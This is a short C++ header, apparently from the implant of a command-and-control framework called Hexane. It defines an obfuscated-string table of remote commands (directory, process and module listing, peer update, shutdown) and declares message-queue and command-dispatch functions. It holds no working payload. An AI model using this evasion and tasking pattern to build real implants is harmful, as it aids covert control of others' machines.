#ifndef HEXANE_CORELIB_MESSAGE_HPP
#define HEXANE_CORELIB_MESSAGE_HPP
#include <core/corelib.hpp>

_code_seg(".rdata") _command_map cmd_map[] = {
    // todo: use name hashes instead of obfuscated strings
    { .name = OBF("DirectoryList"),     .address = Commands::DirectoryList },
    { .name = OBF("ProcessModules"),    .address = Commands::ProcessModules },
    { .name = OBF("ProcessList"),       .address = Commands::ProcessList },
    { .name = OBF("UpdatePeer"),        .address = Commands::UpdatePeer },
    { .name = OBF("Shutdown"),          .address = Commands::Shutdown },
    { .name = nullptr,                  .address = nullptr }
};

namespace Dispatcher {
    FUNCTION BOOL PeekPeerId(const _stream *stream);
    FUNCTION VOID AddMessage(_stream *out);
    FUNCTION VOID ClearQueue();
    FUNCTION VOID OutboundQueue(_stream *out);
    FUNCTION VOID QueueSegments(uint8_t *buffer, uint32_t length);
    FUNCTION BOOL PrepareQueue(_stream *out);
    FUNCTION VOID MessageTransmit();
    FUNCTION VOID CommandDispatch (const _stream *in);
}
#endif //HEXANE_CORELIB_MESSAGE_HPP

